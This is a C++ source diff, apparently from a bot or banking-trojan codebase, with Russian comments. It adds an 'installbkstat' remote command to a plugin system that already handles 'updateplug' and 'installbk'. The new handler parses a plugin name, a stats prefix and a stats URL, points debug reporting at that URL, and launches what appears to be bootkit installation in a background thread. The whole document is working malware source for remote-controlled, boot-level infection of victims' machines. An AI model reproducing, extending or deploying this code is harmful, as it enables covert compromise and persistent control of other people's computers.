@@ -10,13 +10,14 @@
 #include "md5.h"
 #include "KillOs_Reboot.h"
 #include "DllLoader.h"
+#include "DbgRpt.h"
 
 //---------------------------------------------------------------------------
 
 
 // Создаём средства для вывода отладочной инфлормации
 
-//#include "BotDebug.h"
+#include "BotDebug.h"
 
 namespace PLGDEBUGTEMPLATES
 {
@@ -837,8 +838,9 @@ LPBYTE Plugin::DownloadFromCache(PCHAR PluginName, bool IsExecutable,  PCHAR Cac
     return Buf;
 }
 //---------------------------------------------------------------------------
-const char* Plugin::CommandUpdatePlug = "updateplug";
-const char* Plugin::CommandInstallBk  = "installbk";
+const char* Plugin::CommandUpdatePlug    = "updateplug";
+const char* Plugin::CommandInstallBk     = "installbk";
+const char* Plugin::CommandInstallBkStat = "installbkstat";
 
 
 bool Plugin::ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
@@ -995,11 +997,70 @@ void AsyncInstallBk(void* Arguments)
 
 bool Plugin::ExecuteInstallBk(void* Manager, PCHAR Command, PCHAR Args)
 {
-	PDBG("ExecuteInstallBk", "'%s'", Args);
+	PDBG("ExecuteInstallBk", "Args: '%s'", Args);
 
 	PCHAR PlugName = STR::New(Args);
 
 	StartThread(AsyncInstallBk, PlugName);
 
+	return true;
+}
+
+// Возвращает истину в случае обнаружения разделителя
+bool IsDelimiterChar(char ch)
+{
+	return (' ' == ch || '\0' == ch);
+}
+
+// Возвращает строку, созданную посредством STR::New
+string GetArgumentFromArgumentListByIndex(PCHAR ArgList, DWORD ArgIndex)
+{
+	DWORD  param_counter = 0;
+	PCHAR  Cur   = ArgList;
+
+	// Надо учесть, что в парсинге нужен конечный '\0' символ
+	PCHAR  Limit = ArgList + m_lstrlen(ArgList) + 1; 
+
+	while (Cur < Limit)
+	{
+		string param;
+		while (!IsDelimiterChar(*Cur))
+		{
+			char s[2] = {*Cur, 0};
+			param += s;
+			Cur++;
+		}
+
+		// Условия предусматривающие наличие нескольких разделителей между 
+		// параметрами.
+		if (param_counter == ArgIndex && param.Length() > 0) return param;
+		if (param.Length() > 0) param_counter++;
+		
+		Cur++;
+	}
+
+	return string();
+}
+
+bool Plugin::ExecuteInstallBkStat(void* Manager, PCHAR Command, PCHAR Args)
+{
+	PDBG("ExecuteInstallBkStat", "Args: '%s'", Args);
+
+	PCHAR ArgsCopy = STR::New(Args);
+
+	string PlugName   = GetArgumentFromArgumentListByIndex(ArgsCopy, 0);
+	string StatPrefix = GetArgumentFromArgumentListByIndex(ArgsCopy, 1);
+	string StatUrl    = GetArgumentFromArgumentListByIndex(ArgsCopy, 2);
+
+	PDBG("ExecuteInstallBkStat",
+		"Parsing arguments results: PlugName='%s' StatPrefix='%s' StatUrl='%s'",
+		PlugName.t_str(), StatPrefix.t_str(), StatUrl.t_str()
+		);
+
+	DebugReportSaveSettings(true, StatPrefix.t_str(), StatUrl.t_str());
+
+	StartThread(AsyncInstallBk, STR::New(PlugName.t_str()));
+
+	STR::Free(ArgsCopy);
 	return true;
 }
